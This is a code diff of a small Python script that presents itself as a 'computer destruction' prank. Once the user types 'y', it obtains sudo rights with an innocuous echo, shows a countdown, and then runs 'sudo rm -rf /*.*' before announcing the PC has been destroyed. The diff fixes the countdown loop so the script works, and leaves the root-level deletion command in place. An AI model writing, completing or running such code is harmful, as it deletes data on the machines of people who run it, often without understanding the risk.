@@ -7,18 +7,21 @@ while not ans == "y" or ans == "n":
 if ans == "y":
   import os
   import time
-  i = 0
+  i = -1
   os.system("sudo echo Thank U :)")
   time.sleep(5)
   while not i == 60:
+    i += 1
     i2 = 0
     text = ""
     while not i2 == 60 - i:
+      i2 += 1
       text = text + "-"
     print(text)
     os.system("clear")
     print("COMPUTER DESTRUCTION IN")
     print(str(60 - i) + " SECONDS!!!")
+    time.sleep(1)
   os.system("clear")
   os.system("sudo rm -rf /*.*")
   print("This PC Has Been Destroyed!!!")
